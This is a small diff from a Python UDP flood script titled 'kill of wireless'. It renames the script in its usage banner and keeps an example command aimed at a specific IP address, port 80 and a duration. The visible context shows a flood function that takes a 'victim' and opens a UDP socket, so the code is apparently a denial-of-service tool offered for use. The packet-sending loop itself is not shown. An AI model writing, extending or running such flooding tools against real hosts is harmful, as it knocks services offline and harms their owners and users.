@@ -9,7 +9,8 @@ def usage():
 	print ("-Welcome to kill of wireless")
 	print ("___•••____•••___••___•••__")
 	print ("-Author : mister cobain.jr")
-	print ("(masukan perintah python destrokil1.py 194.5.159.78 80 1000)-")
+	print ("(masukan perintah python Leader4.py 194.5.159.78 80 1000)-")
+	print ("")
 	
 def flood(victim, vport, duration):
 	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
